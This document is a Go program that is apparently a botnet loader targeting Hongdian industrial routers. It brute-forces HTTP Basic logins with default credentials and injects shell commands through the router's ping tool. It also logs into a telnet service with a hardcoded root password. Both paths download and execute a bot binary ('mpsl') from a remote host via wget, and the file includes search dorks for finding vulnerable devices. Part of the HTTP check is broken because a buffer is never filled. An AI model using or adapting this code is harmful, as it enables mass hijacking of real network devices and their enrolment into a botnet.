package main

import (
	"net"
	"time"
	"os"
	"encoding/base64"
	"strconv"
	"runtime"
	"bufio"
	"fmt"
	"sync"
	"bytes"
	"io"
	"strings"
)

var (
	rdbuf []byte = []byte("")
	logins []string = []string{"admin:admin", "admin:1234", "admin:12345", "admin:123456", "admin:54321", "admin:password", "admin:", "admin:admin123"}

	timeout = 10 * time.Second

	processed uint64
	found uint64
	exploited uint64

	port = os.Args[1]

	executeMessage = "snow slide"

	infect_payload = "cd+/tmp%3Brm+-rf+mpsl%3Bbusybox+wget+http://ip/mpsl%3Bchmod+777+mpsl%3B./mpsl+hongdian"

	wg sync.WaitGroup
)

/*
	Dork: WWW-Authenticate: Basic realm="Server Status" !Cloud !Citrix !Docker
	Dork2: app:"Hongdian H8922 Industrial Router" !Docker !Citrix !Docker
*/

func zeroByte(a []byte) {

    for i := range a {
        a[i] = 0
    }
}

func telnetRead(conn net.Conn, prompt string) bool {

	for {
		buff := make([]byte, 1024)
		len, err := conn.Read(buff)

		if len <= 0 {
			return false
		}

		if err != nil {
			return false
		}

		buf := string(buff)

		if strings.Contains(buf, prompt) {
			return true
		}
	}

	return false
}

func findBot(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	conn.SetDeadline(time.Now().Add(timeout))
	defer conn.Close()

	conn.Write([]byte("GET / HTTP/1.0\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n"))

	var buf bytes.Buffer
	io.Copy(&buf, conn)

	return strings.Contains(buf.String(), "realm=\"Server Status\"")
}

func loadDevice(target, login string) bool {
        conn, err := net.DialTimeout("tcp", target, timeout)

    	if err != nil {
        	return false
    	}

    	conn.SetDeadline(time.Now().Add(timeout))

    	authStr := base64.StdEncoding.EncodeToString([]byte(login))
    	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozila/5.0\r\nAuthorization: Basic " + authStr + "\r\nConnection: close\r\n\r\n"))

    	var buf bytes.Buffer
    	io.Copy(&buf, conn)

    	conn.Close()

    	if strings.Contains(string(rdbuf), "HTTP/1.1 200 OK") {

    		conn, err = net.DialTimeout("tcp", target, timeout)

    		if err != nil {
    			return false
    		}

    		conn.SetDeadline(time.Now().Add(timeout))

    		payload := "op_type=ping&destination=%3B"
    		payload += infect_payload
    		payload += "&user_options="
    		cntlen := strconv.Itoa(len(payload))

    		conn.Write([]byte("POST /tools.cgi HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozila/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + cntlen + "\r\nOrigin: http://" + target + "\r\nAuthorization: Basic " + authStr + "\r\nConnection: close\r\nReferer: http://" + target + "/tools.cgi\r\nUpgrade-Insecure-Requests: 1\r\n\r\n" + payload + "\r\n\r\n"))
    		
    		io.Copy(&buf, conn)

    		if strings.Contains(string(rdbuf), "HTTP/1.1 200 OK") && strings.Contains(string(rdbuf), "/themes/oem.css") {
    			fmt.Printf("\x1b[38;5;46mHongdian\x1b[38;5;15m: \x1b[38;5;134m%s:%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", target, login)
    			conn.Close()
    			exploited++
    			return true
    		}

    		conn.Close()
            return false
        }

    return false
}

func loadTelnet(target string) {
	ip := strings.Split(target, ":")[0]

	conn, err := net.DialTimeout("tcp", ip + ":5188", timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	if !telnetRead(conn, ":") {
		return
	}

	fmt.Printf("[HONGDIAN] found telnet %s\n", target)

	conn.Write([]byte("root\r\n"))

	if !telnetRead(conn, ":") {
		return
	}

	conn.Write([]byte("superzxmn\r\n"))

	if !telnetRead(conn,"#") {
		return
	}

	fmt.Printf("[HONGDIAN] logged in %s\n", target)

	conn.Write([]byte("cd /tmp; rm -rf mpsl; wget http://ip/mpsl; chmod 777 mpsl; chmod 777 mpsl; ./mpsl hongdian\r\n"))

	if !telnetRead(conn, executeMessage) {
		return
	}

	fmt.Printf("[HONGDIAN] infected %s\n", target)
}

func infectDevice(target string) {

	wg.Add(1)
	defer wg.Done()

	processed++

	/*
	if !findBot(target) {
		return
	}
	*/

	found++

	go loadTelnet(target)

    for i := 0; i < len(logins); i++ {
    	if loadDevice(target, logins[i]) {
    		break
    	}
    }
}

func titleWriter() {
	for {
		fmt.Printf("Processed: %d -> Found: %d -> Exploited: %d -> Go Routines: %d\n", processed, found, exploited, runtime.NumGoroutine())
		time.Sleep(1 * time.Second)
	}
}

func main() {
	scanner := bufio.NewScanner(os.Stdin)

	go titleWriter()

	for scanner.Scan() {
		if strings.Compare(port, "manual") == 0 {
			go infectDevice(scanner.Text())

		} else {
			go infectDevice(scanner.Text() + ":" + port)
		}
	}

	time.Sleep(10 * time.Second)
	wg.Wait()
}

